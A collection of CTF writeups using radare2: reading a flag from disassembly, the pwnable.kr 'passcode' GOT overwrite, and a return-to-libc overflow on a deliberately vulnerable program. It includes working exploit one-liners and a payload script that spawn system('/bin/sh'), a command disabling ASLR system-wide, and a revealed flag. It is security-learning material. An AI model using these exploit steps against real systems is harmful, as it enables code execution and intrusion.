<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-chrysh
description: CTF writeups and security challenges by chrysh.
---

# Writeups by chrysh

Source repository: `/repos/chrysh`

## Repository Index

- ctf_writeups/README.md
- ctf_writeups/radare2/return_to_libc/README.md
- ctf_writeups/pwnable.kr/passcode/README.md
- ctf_writeups/mrmcd_ctf_2017/once_upon_a_time/README.md

## Writeup Content


### File: ctf_writeups/README.md

# ctf_writeups
CTF writeups and other fun hacking stuff, mainly with radare2.

## License
This project is licensed under the terms of the CC BY-SA license.



### File: ctf_writeups/mrmcd_ctf_2017/once_upon_a_time/README.md

## Once upon a time ##

All flags in this CTF started with the string "MRMCD{.." or "mrmcd{.." .

To look at the main function in radare2, I used the following commands:
```
> aaa           ; analyze all functions
> pdf@main      ; disassemble main function
```

Opening the binary and looking at the main function, it looks like the values which are compared to a local variable were ASCII.
![r2 command pdf@main](./radare1.png)

Filtering for the cmp instructions (~ works like a grep in radare2), the flag can directly be read.

```
[0x00000660]> pdf@main~cmp      ; disassemble main function, grep for cmp command
|     |`--> 0x000007ec      4883bde8fdff.  cmp qword [local_218h], 0
|       |   0x00000808      4883bde0fdff.  cmp qword [local_220h], 0x4d ; [0x4d:8]=0x40000000 ; 'M'
|     |`--> 0x00000848      4883bdf8fdff.  cmp qword [local_208h], 0
|       |   0x00000864      4883bdf0fdff.  cmp qword [local_210h], 0x52 ; [0x52:8]=0x40000000000000 ; 'R'
|     |`--> 0x000008a4      4883bd08feff.  cmp qword [local_1f8h], 0
|       |   0x000008c0      4883bd00feff.  cmp qword [local_200h], 0x4d ; [0x4d:8]=0x40000000 ; 'M'
|     |`--> 0x00000900      4883bd18feff.  cmp qword [local_1e8h], 0
|       |   0x0000091c      4883bd10feff.  cmp qword [local_1f0h], 0x43 ; [0x43:8]=0x400000000500 ; 'C'
|     |`--> 0x0000095c      4883bd28feff.  cmp qword [local_1d8h], 0
|       |   0x00000978      4883bd20feff.  cmp qword [local_1e0h], 0x44 ; [0x44:8]=0x4000000005 ; 'D'
|     |`--> 0x000009b8      4883bd38feff.  cmp qword [local_1c8h], 0
|       |   0x000009d4      4883bd30feff.  cmp qword [local_1d0h], 0x7b ; [0x7b:8]=0x2380000000400 ; '{'
|     |`--> 0x00000a14      4883bd48feff.  cmp qword [local_1b8h], 0
|       |   0x00000a30      4883bd40feff.  cmp qword [local_1c0h], 0x73 ; [0x73:8]=0x30000000000 ; 's'
|     |`--> 0x00000a70      4883bd58feff.  cmp qword [local_1a8h], 0
|       |   0x00000a8c      4883bd50feff.  cmp qword [local_1b0h], 0x6f ; [0x6f:8]=0x800 ; 'o'
|     |`--> 0x00000acc      4883bd68feff.  cmp qword [local_198h], 0
|       |   0x00000ae8      4883bd60feff.  cmp qword [local_1a0h], 0x5f ; [0x5f:8]=0x1f800 ; '_'
|     |`--> 0x00000b28      4883bd78feff.  cmp qword [local_188h], 0
|       |   0x00000b44      4883bd70feff.  cmp qword [local_190h], 0x73 ; [0x73:8]=0x30000000000 ; 's'
|     |`--> 0x00000b84      4883bd88feff.  cmp qword [local_178h], 0
|       |   0x00000ba0      4883bd80feff.  cmp qword [local_180h], 0x6f ; [0x6f:8]=0x800 ; 'o'
|     |`--> 0x00000be0      4883bd98feff.  cmp qword [local_168h], 0
|       |   0x00000bfc      4883bd90feff.  cmp qword [local_170h], 0x72 ; [0x72:8]=0x3000000000000 ; 'r'
|     |`--> 0x00000c3c      4883bda8feff.  cmp qword [local_158h], 0
|       |   0x00000c58      4883bda0feff.  cmp qword [local_160h], 0x72 ; [0x72:8]=0x3000000000000 ; 'r'
|     |`--> 0x00000c98      4883bdb8feff.  cmp qword [local_148h], 0
|       |   0x00000cb4      4883bdb0feff.  cmp qword [local_150h], 0x79 ; [0x79:8]=0x3800000004000000 ; 'y'
|     |`--> 0x00000cf4      4883bdc8feff.  cmp qword [local_138h], 0
|       |   0x00000d10      4883bdc0feff.  cmp qword [local_140h], 0x5f ; [0x5f:8]=0x1f800 ; '_'
|     |`--> 0x00000d50      4883bdd8feff.  cmp qword [local_128h], 0
|       |   0x00000d6c      4883bdd0feff.  cmp qword [local_130h], 0x66 ; [0x66:8]=0x1f80000 ; 'f'
|     |`--> 0x00000dac      4883bde8feff.  cmp qword [local_118h], 0
|       |   0x00000dc8      4883bde0feff.  cmp qword [local_120h], 0x6f ; [0x6f:8]=0x800 ; 'o'
|     |`--> 0x00000e08      4883bdf8feff.  cmp qword [local_108h], 0
|       |   0x00000e24      4883bdf0feff.  cmp qword [local_110h], 0x72 ; [0x72:8]=0x3000000000000 ; 'r'
|     |`--> 0x00000e64      4883bd08ffff.  cmp qword [local_f8h], 0
|       |   0x00000e80      4883bd00ffff.  cmp qword [local_100h], 0x5f ; [0x5f:8]=0x1f800 ; '_'
|     |`--> 0x00000ec0      4883bd18ffff.  cmp qword [local_e8h], 0
|       |   0x00000edc      4883bd10ffff.  cmp qword [local_f0h], 0x74 ; [0x74:8]=0x300000000 ; 't'
|     |`--> 0x00000f1c      4883bd28ffff.  cmp qword [local_d8h], 0
|       |   0x00000f38      4883bd20ffff.  cmp qword [local_e0h], 0x68 ; [0x68:8]=504 ; 'h'
|     |`--> 0x00000f78      4883bd38ffff.  cmp qword [local_c8h], 0
|       |   0x00000f94      4883bd30ffff.  cmp qword [local_d0h], 0x65 ; [0x65:8]=0x1f8000000 ; 'e'
|     |`--> 0x00000fd4      4883bd48ffff.  cmp qword [local_b8h], 0
|       |   0x00000ff0      4883bd40ffff.  cmp qword [local_c0h], 0x5f ; [0x5f:8]=0x1f800 ; '_'
|     |`--> 0x00001030      4883bd58ffff.  cmp qword [local_a8h], 0
|       |   0x0000104c      4883bd50ffff.  cmp qword [local_b0h], 0x64 ; [0x64:8]=0x1f800000000 ; 'd'
|     |`--> 0x0000108c      4883bd68ffff.  cmp qword [local_98h], 0
|       |   0x000010a8      4883bd60ffff.  cmp qword [local_a0h], 0x65 ; [0x65:8]=0x1f8000000 ; 'e'
|     |`--> 0x000010e8      4883bd78ffff.  cmp qword [local_88h], 0
|       |   0x00001104      4883bd70ffff.  cmp qword [local_90h], 0x6c ; [0x6c:8]=0x800000000 ; 'l'
|     |`--> 0x0000113b      48837d8800     cmp qword [local_78h], 0
|       |   0x0000114e      48837d8061     cmp qword [local_80h], 0x61 ; [0x61:8]=0xf800000000000001 ; 'a'
|     |`--> 0x00001182      48837d9800     cmp qword [local_68h], 0
|       |   0x00001195      48837d9079     cmp qword [local_70h], 0x79 ; [0x79:8]=0x3800000004000000 ; 'y'
|     |`--> 0x000011c9      48837da800     cmp qword [local_58h], 0
|       |   0x000011dc      48837da07d     cmp qword [local_60h], 0x7d ; [0x7d:8]=0x238000000 ; '}'
```
The flag is: `MRMCD{so_sorry_for_the_delay}`.



### File: ctf_writeups/pwnable.kr/passcode/README.md

## Pwnable.kr level1: passcode ##

### Prior knowledge ###
The task for this challenge was overwriting an entry in the GOT.
The link https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html gives a nice introduction into the topic of GOT and PLT.
The binary and code was given.

```
% cat passcode.c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");

	printf("pw1: %x, pw2: %x\n", passcode1, passcode2);
	printf("should be: pw1: %x, pw2: %x\n", 338150, 13371337);

	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;
}
```

I won't go into the details of the bug.
The details of the challenge are described in http://xhyumiracle.com/pwnable-kr-passcode/.
My aim is to describe how to solve the challenge using `radare2` tools, python and strace.

### Generating patterns with radare2 ###

First, we generate a pattern using the `radare2` tools to find out at which offset of our input data the instruction pointer gets overwritten, which usually results in a seg fault if it's random data.

```
% ragg2 -P 100 -r ; echo
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
hacker@ctf:~/ctf/pwnable.kr/level1/passcode$ ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
Welcome AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh!
enter passcode1 : 9
Segmentation fault
```

The generated input must be 100 chars, because that's the size which is read into the variable `name`.
Every char entered above this limit will be buffered until the next call of scanf.
Since the next call will expect a decimal number, we can either directly put the decimal number behind it, or enter it on the next scanf call (shown as a read `strace`).

To figure out the part of the pattern which generated the fault, we use strace, which will show the address in `$eip` which caused the segmentation fault.

```
% strace -f ./passcode
execve("./passcode", ["./passcode"], [/* 21 vars */]) = 0
[ Process PID=32335 runs in 32 bit mode. ]
...
write(1, "enter you name : ", 17enter you name : )       = 17
read(0, AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
"AAABAACAADAAEAAFAAGAAHAAIAAJAAKA"..., 1024) = 101
write(1, "Welcome AAABAACAADAAEAAFAAGAAHAA"..., 110Welcome AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh!
) = 110
write(1, "enter passcode1 : ", 18enter passcode1 : )      = 18
read(0, 9
"9\n", 1024)                    = 2
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x68414167} ---
+++ killed by SIGSEGV +++
Segmentation fault
```

The pattern `0x68414167` ('hAAg') generated the segfault.
Since the generated pattern is a reproducible De Bruijn Pattern, we search for the offset in the generated pattern using the `wopO` command of `radare2`. I did not find a way to use commandline tools only to find the offset out, without starting `radare2`.

```
% r2 ./passcode
[0x080484b0]> wop?
|Usage: wop[DO] len @ addr | value
| wopD len [@ addr]   Write a De Bruijn Pattern of length 'len' at address 'addr'
| wopD* len [@ addr]  Show wx command that creates a debruijn pattern of a specific length
| wopO value          Finds the given value into a De Bruijn Pattern at current offset
[0x080484b0]> wopO 0x68414167
96
```

The data which overwrites the eip is therefore located at offset 96 of the input data.

### Overwriting the GOT entry ###

We find first where the function fflush is located in the PLT with the `r2` function `ii`, which lists all the imports, and filter for the function `fflush` using `~`.
The command `pd @addr` disassmbles the instructions at `addr`.
```
[0x080484b0]> ii~fflush
ordinal=002 plt=0x08048430 bind=GLOBAL type=FUNC name=fflush
[0x080484b0]> pd@0x08048430
/ (fcn) sym.imp.fflush 6
|   sym.imp.fflush ();
|     !!!      ; CALL XREF from 0x08048593 (sym.login)
\     |||   0x08048430      ff2504a00408   jmp dword [reloc.fflush_4]  ; 0x804a004 ; "6\x84\x04\bF\x84\x04\bV\x84\x04\bf\x84\x04\bv\x84\x04\b\x86\x84\x04\b\x96\x84\x04\b\xa6\x84\x04\b"
      !!!      ; DATA XREF from 0x08048430 (sym.imp.fflush)
```

Looking at the code at that address, we find the entry for fflush in the GOT to be located at 0x804a004.
This is where we have to overwrite the address of the real fflush function with an address which will print the flag, e.g. the address `0x080485d7` in `login()`.
The `radare2` command `pd 5 @addr` disassembles 5 instruction starting at position `addr`.

```
[0x08048410]> pd 5 @0x080485d7
|           0x080485d7      c70424a58704.  mov dword [esp], str.Login_OK_ ; [0x80487a5:4]=0x69676f4c ; "Login OK!" ; const char * s
|           0x080485de      e86dfeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080485e3      c70424af8704.  mov dword [esp], str._bin_cat_flag ; [0x80487af:4]=0x6e69622f ; "/bin/cat flag" ; const char * string
|           0x080485ea      e871feffff     call sym.imp.system         ; int system(const char *string)
|           0x080485ef      c9             leave

```

Here is a python snippet for writing address in little endian order, e.g. using ipython:
```
In [1]: import struct; struct.pack("<I", 0x804a004)
Out[1]: '\x04\xa0\x04\x08'
```


For our attack, we have to fill the variable `name` with 96 random chars, the GOT address which contains the address of `fflush` `0x804a004`, and write our chosen address `0x080485d7` into `passcode1`.
This can be expressed in one line:
```
% python -c "print 'A'*96+'\x04\xa0\x04\x08'+str(0x080485d7)" | ./passcode
```



### File: ctf_writeups/radare2/return_to_libc/README.md

## Return-to-libc with radare2 with no ASLR ##

The exploit is based on the descriptions by Saif El-Sherei: <https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf>.
Read this pdf for details on how return to libc works in detail.
This document focuses on using radare2 for the exploit.

### Compiling ###

```
% cat bufoverflow.c                             :(
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
    char buf[256];
    memcpy(buf, argv[1],strlen(argv[1]));
    printf(buf);
}
% gcc -m32 -mpreferred-stack-boundary=2 bufoverflow.c -o bufoverflow
```

The idea is to overwrite the return address of the main function with a function address we took from the libc.

We compile a 32 bit binary to make the task easier, because otherwise the function addresses we need to pass would contain zeros, and `strlen` would return a smaller number of chars than we initially wanted to `memcpy`.
Furthermore, with `-mpreferred-stack-boundary=2` we tell GCC to align the stack to a 4-byte boundary.
If we specified  `-mpreferred-stack-boundary=4`, the stack would be aligned to a 16-byte boundary, which would change the amount of A's we need to pass to the binary to be exploited.

Furthermore, we have to deactivate the ASLR. To do this system-wide, zero has to be written to the right proc file.
```
% echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### Finding the right offset ###

The buffer is 256 chars wide. The frame pointer (ebp) is pushed to the stack as part of the function prologue, which adds another 4 byte. Furthermore, ebx (4 byte again) is saved by gcc as a callee-saved register.

```
0x08048466      55             push ebp
0x08048467      89e5           mov ebp, esp
0x08048469      53             push ebx
0x0804846a      81ec00010000   sub esp, 0x100
```

In sum, we have to pass 264 random chars (usually A's are used) to the program, followed by the 4 byte of new return address we want to overwrite the original address with.

```
% ./bufoverflow `python -c "print 'A'*260"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%
```

When passing 268 A's, the return address is overwritten. We can check that using the linux tool `strace`.

```
% strace ./bufoverflow `python -c "print 'A'*268"` 
....
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
+++ killed by SIGSEGV +++
[1]    9950 segmentation fault  strace -f ./bufoverflow `python -c "print 'A'*268"`
```

### Finding the symbol addresses ###

Basically, we want to execute `system("/bin/sh")`, using the symbols we already have in the libc.
Therefore, we want to put the following data on the stack.

```
| 264 garbage-A's | addr_system | 4 byte garbage | addr_string_bin_sh |
```

First we need to find the address of the function `system()` and the string `/bin/sh` in the libc.
We start radare2 in debug mode (`radare2 -d PROGNAME`).

```
% radare2 -d bufoverflow
Process with PID 7286 started...
= attach 7286 7286
bin.baddr 0x56555000
Using 0x56555000
asm.bits 32
Continue until 0x5655557d using 1 bpsize
hit breakpoint at: 5655557d
```

In radare2, `-d PROGNAME PROGARGS` has to be the last option passed, since otherwise the following arguments are interpreted as arguments to the program to be debugged instead of to radare2.

The program arguments can also be passed inside of radare2 using the command `> ood foo`.


The command `dcu main` (debug continue until) executes the program until main is reached. In that manner, we can be sure that the libraries are already loaded when we want to analyze them.
Or you just put `e dbg.bep=main` into your `~/.radare2rc`, so that each program started in debug mode will break when `main()` is reached.

Next, we search for the address of the function `system` (dmi = debug memory).
```
[0x5655557d]> dmi libc system
vaddr=0xf7efcd70 paddr=0x00113d70 ord=246 fwd=NONE sz=68 bind=GLOBAL type=FUNC name=svcerr_systemerr
vaddr=0xf7e23b40 paddr=0x0003ab40 ord=628 fwd=NONE sz=55 bind=GLOBAL type=FUNC name=__libc_system
vaddr=0xf7e23b40 paddr=0x0003ab40 ord=1461 fwd=NONE sz=55 bind=WEAK type=FUNC name=system
```
The syntax is `dmi LIB_NAME SYMBOL_NAME`.
The `system()` address in my case is 0xf7e23b40.

_In my case, and error code 1 was returned in radare2 when searching symbols in the library. The solution was to copy the binary to another directory. No idea, why that worked._
```
[0xf7e67b06]> dmi libc system
error code 1
```

Next, we search for the address of the string "/bin/sh" in the libc.
The radare2 command for searching strings is `/ STRING`.
To search the string starting from a certain address, execute `/ STRING @ address`.
```
[0x5655557d]> dmi
0x56555000 /tmp/bufoverflow
0xf7de9000 /lib/i386-linux-gnu/libc-2.24.so
0xf7fd9000 /lib/i386-linux-gnu/ld-2.24.so
[0x5655557d]> / /bin/sh @0xf7de9000
Searching 7 bytes from 0x00000000 to 0xffffffffffffffff: 2f 62 69 6e 2f 73 68
Searching 7 bytes in [0xf7de9000-0xf7f9a000]
hits: 1
0xf7f45dc8 hit0_0 .b/strtod_l.c-c/bin/shexit 0canonica.
```

An equivalent chain of commands is seeking to the address where the libc is mapped and performing the string search there.
```
[0x5655557d]> s 0xf7de9000
[0xf7de9000]> / /bin/sh
Searching 7 bytes from 0x00000000 to 0xffffffffffffffff: 2f 62 69 6e 2f 73 68
Searching 7 bytes in [0xf7de9000-0xf7f9a000]
hits: 1
0xf7f45dc8 hit2_0 .b/strtod_l.c-c/bin/shexit 0canonica.
```

The address of the string is therefore `0xf7f45dc8`.

### Scripting the input ###
With a python script we can construct the input and directly pass it to the binary.

```
% cat input.py
import struct

addr_shellstr=struct.pack("<I", 0xf7f45dc8)
addr_sys=struct.pack("<I", 0xf7e23b40)

print 'A'*264+addr_sys+'D'*4+addr_shellstr
```

```
% ./bufoverflow `python input.py`
$
```

We can also directly pass the input the binary.
```
% ./bufoverflow `python -c "print 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@;\xe2\xf7DDDD\xc8]\xf4\xf7'"`
```

The reason why we have to use python here is that otherwise the shell is interpreting the hex values and they don't get passed to the binary.

